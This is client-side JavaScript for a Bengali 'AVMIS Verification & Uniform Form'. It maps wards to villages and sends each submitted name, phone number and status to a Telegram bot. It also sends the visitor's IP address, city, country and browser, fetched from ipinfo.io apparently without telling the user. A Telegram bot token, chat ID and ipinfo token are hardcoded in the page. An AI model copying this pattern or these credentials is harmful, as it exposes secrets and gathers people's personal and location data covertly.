// ওয়ার্ড → গ্রাম ম্যাপিং
const wardVillageMap = {
  '1': ['ডুমনী', 'ফাউগান'],
  '2': ['প্রহলাদপুর'],
  '3': ['আটিপাড়া', 'নানাইয়া', 'নানাইয়ারচর', 'বাঘমারা', 'মার্তারচর'],
  '4': ['আতলড়া', 'বনখড়িয়া'],
  '5': ['উজলিয়া', 'করলামাধবপুর', 'বাশকোপা', 'সেরালিয়াবাড়ী'],
  '6': ['আশুলীয়াপাড়া', 'পোতাবাড়ী', 'ভিটিপাড়া', 'মরিচারচালা'],
  '7': ['কদমা', 'প্রতাবপুর', 'রাখালিয়া', 'লোহাগাছিয়া'],
  '8': ['চরদমদমা', 'দমদমা'],
  '9': ['নিমুরিয়া', 'মেন্দিপুর', 'মারতা']
};

const wardField = document.getElementById('ward');
const villageField = document.getElementById('village');
wardField.addEventListener('change', () => {
  const villages = wardVillageMap[wardField.value] || [];
  villageField.innerHTML = '<option value="">-- গ্রাম নির্বাচন করুন --</option>';
  villages.forEach(v => {
    const opt = document.createElement('option');
    opt.value = v;
    opt.text = v;
    villageField.appendChild(opt);
  });
});

// Telegram এ পাঠানোর কোড
const form = document.getElementById('avmisForm');
const loadingDiv = document.getElementById('loading');

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  loadingDiv.style.display = 'flex';

  const token = "8455761126:AAHcX7qjkb5qtigID9RG7G_dVQ7b71xjXuk"; // তোমার বট টোকেন বসাও
  const chatId = "7079142411"; // তোমার চ্যাট আইডি বসাও

  const name = document.getElementById('name').value;
  const phone = document.getElementById('phone').value;
  const ward = document.getElementById('ward').value;
  const village = document.getElementById('village').value;
  const status = document.getElementById('status').value;
  const category = document.getElementById('category').value;

  // IP + Location
  let ip = 'Unknown', country = 'Unknown', city = 'Unknown';
  try {
    const res = await fetch('https://ipinfo.io/json?token=24260cb6dd365a');
    const data = await res.json();
    ip = data.ip;
    country = data.country;
    city = data.city;
  } catch (err) { console.log('IP Error', err); }

  const device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
  const browser = navigator.userAgent;

  // মেসেজ তৈরি
  let message = `📋 AVMIS Verification & Uniform Form\n\nনাম: ${name}\nমোবাইল: ${phone}\nওয়ার্ড: ${ward}\nগ্রাম: ${village}\nAVMIS Status: ${status}\nকটি: ${category}\n\n🌐 IP: ${ip}\nদেশ: ${country}\nশহর: ${city}\nডিভাইস: ${device}\nব্রাউজার: ${browser}`;

  // CSV লাইন
  let sheetLine = `"${name}","${phone}","${ward}","${village}","${status}","${category}","${ip}","${country}","${city}","${device}"`;

  // Telegram এ পাঠানো
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: `${message}\n\n📄 Sheet-ready:\n${sheetLine}`
    })
  });

  loadingDiv.style.display = 'none';
  alert("✅ তথ্য সফলভাবে সাবমিট হয়েছে!");
  form.reset();
});
